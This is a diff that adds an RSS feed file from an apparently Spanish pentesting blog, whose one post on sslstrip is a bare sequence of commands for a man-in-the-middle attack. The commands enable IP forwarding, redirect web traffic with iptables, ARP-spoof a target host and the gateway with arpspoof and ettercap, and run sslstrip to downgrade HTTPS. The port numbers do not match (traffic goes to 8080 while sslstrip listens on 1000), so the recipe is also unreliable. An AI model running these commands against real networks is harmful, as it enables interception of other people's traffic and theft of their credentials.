@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>sslstrip on #&gt; fireroot</title>
+        <link>https://www.procamora.com/tags/sslstrip/</link>
+        <description>Recent content in sslstrip on #&gt; fireroot</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>es</language>
+        <lastBuildDate>Fri, 04 Sep 2015 00:00:00 +0000</lastBuildDate><atom:link href="https://www.procamora.com/tags/sslstrip/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>sslstrip</title>
+        <link>https://www.procamora.com/p/ssltrip2/</link>
+        <pubDate>Fri, 04 Sep 2015 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.procamora.com/p/ssltrip2/</guid>
+        <description>&lt;img src="https://www.procamora.com/covers/pentesting.png" alt="Featured image of post sslstrip" /&gt;&lt;p&gt;&lt;code&gt;sysctl -w net.ipv4.ip_forward=1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cat /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 8080&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;######opcional
+&lt;code&gt;arpspoof -i eth0 -t 192.168.1.2 192.168.1.1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;######otra pestaña
+&lt;code&gt;python sslstrip.py -l 1000&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;######otra pestaña
+&lt;code&gt;ettercap -Tq -i eth0&lt;/code&gt; o &lt;code&gt;ettercap -T -q -i eth0 -M arp // //&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
